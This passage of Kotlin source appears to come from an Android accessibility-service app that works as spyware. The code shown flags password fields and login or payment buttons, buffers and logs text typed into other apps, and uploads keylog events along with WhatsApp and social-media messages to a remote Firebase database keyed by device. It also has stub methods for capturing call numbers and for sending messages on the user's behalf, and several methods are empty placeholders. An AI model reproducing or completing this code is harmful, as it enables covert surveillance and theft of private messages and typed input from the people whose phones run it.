            else -> "Unknown"
        }
    }

    // Implement all the missing methods from the original services
    private fun extractAndUploadWhatsAppMessage(node: AccessibilityNodeInfo, packageName: String) {
        // Implementation from WhatsAppService
    }

    private fun extractAndUploadSocialMediaMessage(node: AccessibilityNodeInfo, packageName: String) {
        // Implementation from SocialMediaService
    }

    private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
        // Implementation from both services
    }

    private fun extractWhatsAppChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        // Implementation from WhatsAppService
    }

    private fun extractSocialMediaChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        // Implementation from SocialMediaService
    }

    private fun extractCallInformation(packageName: String) {
        // Implementation from CallAccessibilityService
    }

    private fun extractPhoneNumber(text: String): String? {
        // Implementation from CallAccessibilityService
        return null
    }

    private fun reportCallNumber(phoneNumber: String, source: String) {
        // Implementation from CallAccessibilityService
    }

    private fun navigateToMessages(packageName: String): Boolean {
        // Implementation for navigating to messages
        return true
    }

    private fun searchForRecipient(recipient: String, packageName: String): Boolean {
        // Implementation for searching recipient
        return true
    }

    private fun sendMessageToRecipient(message: String, packageName: String): Boolean {
        // Implementation for sending message
        return true
    }

    private fun uploadWhatsAppMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("WhatsApp message uploaded: ${message["content"]} (${message["packageName"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("WhatsApp message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading WhatsApp message", e)
            }
        }
    }

    private fun uploadSocialMediaMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("social_media/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Social media message uploaded: ${message["content"]} (${message["platform"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Social media message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading social media message", e)
            }
        }
    }

    // Keylogger helper methods
    private fun isInputField(className: String, source: AccessibilityNodeInfo?): Boolean {
        if (INPUT_FIELD_CLASSES.any { className.contains(it) }) {
            return true
        }
        
        source?.let { node ->
            if (node.isEditable) {
                return true
            }
            
            if (node.inputType > 0) {
                return true
            }
        }
        
        return false
    }

    private fun isPasswordField(source: AccessibilityNodeInfo?): Boolean {
        source?.let { node ->
            val inputType = node.inputType
            if ((inputType and 0x00000080) != 0 || 
                (inputType and 0x00000010) != 0 || 
                (inputType and 0x00000020) != 0) {
                return true
            }
            
            val hint = node.hintText?.toString()?.lowercase() ?: ""
            if (PASSWORD_HINTS.any { hint.contains(it) }) {
                return true
            }
            
            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
            if (PASSWORD_HINTS.any { contentDesc.contains(it) }) {
                return true
            }
            
            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            if (PASSWORD_HINTS.any { viewId.contains(it) }) {
                return true
            }
        }
        
        return false
    }

    private fun isImportantButton(text: String): Boolean {
        val lowerText = text.lowercase()
        val importantButtons = setOf(
            "login", "sign in", "log in", "submit", "send", "post", "share",
            "buy", "purchase", "pay", "confirm", "continue", "next", "done",
            "save", "update", "delete", "remove", "cancel", "ok"
        )
        return importantButtons.any { lowerText.contains(it) }
    }

    private fun getFieldInfo(source: AccessibilityNodeInfo?): FieldInfo {
        source?.let { node ->
            val hint = node.hintText?.toString() ?: ""
            val id = node.viewIdResourceName ?: ""
            val isPassword = isPasswordField(node)
            
            return FieldInfo(
                type = if (isPassword) "password" else "text",
                hint = hint,
                id = id
            )
        }
        
        return FieldInfo("unknown", "", "")
    }

    private data class FieldInfo(
        val type: String,
        val hint: String,
        val id: String
    )

    private fun scheduleBufferFlush(packageName: String, className: String, fieldType: String) {
        flushRunnable?.let { handler.removeCallbacks(it) }
        
        flushRunnable = Runnable {
            flushTextBuffer(packageName, className, fieldType)
        }
        handler.postDelayed(flushRunnable!!, BUFFER_FLUSH_DELAY)
    }

    private fun flushTextBuffer(packageName: String = lastPackage, className: String = lastClassName, fieldType: String = "text") {
        try {
            if (textBuffer.isNotEmpty()) {
                val text = textBuffer.toString()
                textBuffer.clear()
                
                logKeylogEvent(
                    packageName = packageName,
                    className = className,
                    eventType = "text_input",
                    text = text,
                    fieldType = fieldType,
                    fieldHint = "",
                    fieldId = ""
                )
                
                Logger.log("Text buffer flushed for $packageName: ${if (fieldType == "password") "[PASSWORD]" else text}")
            }
        } catch (e: Exception) {
            Logger.error("Error flushing text buffer", e)
        }
    }

    private fun logKeylogEvent(
        packageName: String,
        className: String,
        eventType: String,
        text: String,
        fieldType: String,
        fieldHint: String,
        fieldId: String
    ) {
        try {
            val eventId = generateEventId(packageName, className, eventType, text, fieldType)
            
            val now = System.currentTimeMillis()
            if (keylogCache.containsKey(eventId)) {
                val lastTime = keylogCache[eventId] ?: 0
                if (now - lastTime < 1000) {
                    return
                }
            }
            
            keylogCache[eventId] = now
            
            scope.launch {
                try {
                    val keylogData = mapOf(
                        "packageName" to packageName,
                        "className" to className,
                        "eventType" to eventType,
                        "text" to if (fieldType == "password") "[PASSWORD:${text.length}]" else text,
                        "fieldType" to fieldType,
                        "fieldHint" to fieldHint,
                        "fieldId" to fieldId,
                        "timestamp" to now,
                        "uploaded" to System.currentTimeMillis(),
                        "eventId" to eventId
                    )

                    db.child("Device").child(deviceId).child("keylog_data").push().setValue(keylogData)
                        .addOnSuccessListener {
                            Logger.log("Keylog event uploaded: $eventType in $packageName")
                        }
                        .addOnFailureListener { e ->
                            Logger.error("Failed to upload keylog event", e)
                        }
                } catch (e: Exception) {
                    Logger.error("Error uploading keylog event", e)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error logging keylog event", e)
        }
    }

    private fun generateEventId(packageName: String, className: String, eventType: String, text: String, fieldType: String): String {
        return try {
            val input = "$packageName$className$eventType$fieldType${System.currentTimeMillis() / 1000}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 16)
        } catch (e: Exception) {
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun updateKeyloggerStatus(commandId: String, status: String, error: String?) {
        try {
            val statusData = mutableMapOf<String, Any>(
                "commandId" to commandId,
                "status" to status,
                "timestamp" to System.currentTimeMillis(),
                "isEnabled" to keyloggerEnabled
            )
            
            if (error != null) {
                statusData["error"] = error
            }

            db.child("Device").child(deviceId).child("keylogger_status").setValue(statusData)
                .addOnSuccessListener {
                    Logger.log("Keylogger status updated: $status for command: $commandId")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update keylogger status", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating keylogger status", e)
        }
    }

    override fun onInterrupt() {
        Logger.log("UnifiedAccessibilityService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            screenWakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            flushTextBuffer()
            scope.cancel()
            valueEventListener.forEach { (_, listener) ->
                try {
                    db.child("Device").child(deviceId).removeEventListener(listener)
                } catch (e: Exception) {
                    Logger.error("Error removing listener", e)
                }
            }
            valueEventListener.clear()
            Logger.log("UnifiedAccessibilityService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying UnifiedAccessibilityService", e)
        }
    }
}